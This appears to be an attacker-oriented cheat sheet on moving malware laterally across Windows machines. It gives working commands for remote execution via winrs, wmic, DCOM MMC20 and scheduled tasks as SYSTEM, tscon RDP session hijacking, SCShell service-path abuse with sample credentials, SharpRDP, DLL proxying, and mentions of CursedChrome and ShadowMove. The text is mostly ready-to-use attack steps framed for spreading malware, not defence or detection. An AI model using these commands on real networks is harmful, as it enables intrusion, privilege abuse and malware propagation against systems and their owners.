## How to laterally move the malware inside the system ? 

- `winrs -r:ws01 "cmd /c hostname & notepad"` command uses the winrs binary to start the notepad and hostname processes inside the machine named `ws01` from the different machine.

- We can use  Windows Management Instrumentation for code execution in another compromised system from a victim system.
    - `wmic /node:10.0.0.6 /user:administrator process call create "cmd.exe /c calc"` can spawn the cmd.exe and calc processes inside the machine with ip address 10.0.0.6 from another victim system.

- RDP Hijacking or Using Remote Desktop. The `tscon.exe` is an important binary that allows us to connect to other users without being prompted for password for that particular user. It requires privilege escalation. `cmd /k tscon 2 /dest:console` command gives us the desktop session of the console session user while we just entered the password for the user whose session name is `console`.

- Using DCOM:
     - `$a = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","10.0.0.2"))` connects to the other victim.
     - `$a.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c hostname > c:\fromdcom.txt","7")` command executes `cmd /c hostname > c:\fromdcom.txt` command inside the cmd prompt.
     - `[System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","10.0.0.2"))` can be used to give us the info if the command was executed successfully or not.

- Using `ScShell` tool to automate the process where we change the service binpath of the Service Configuration Manager to the malicious command or payload  of ours.
    - `.\scshell.exe ws01 XblAuthManager "C:\windows\system32\cmd.exe /c echo 'lateral hello' > c:\temp\lat.txt" spotless offense 123456`
    - Here `scshell.exe ws01 <VictimService> <MaliciousCommand> <user> offense <password>`

- We can implement TCP relaying or port forwarding

- Here we copy the payload into a dummy DLL that is having the same name and IAT as a missing legitimate DLL that will be proxied and thus will get executed by the system even after being malicious.

- We can use SharpRDP to connect to the remote machine `SharpRDP.exe computername=dc01 command=calc username=offense\administrator password=123456`

- We can use the Chrome extension `CursedChrome`. It is able to open any web pages at hidden level too and can give us the connection proxy to execute any commands.

- ShadowMove.exe duplicates the socket that is connected to any remote connection host and then it duplicates that socket to establish the connection to the attacker.The catch is that it doesnot communicate with the server of the attacker at any point and thus is very difficult to detect.


- `schtasks /create /sc minute /mo 1 /tn "eviltask" /tr calc /ru "SYSTEM" /s dc-mantvydas /u user /p password` for svchost as parent process for movement.
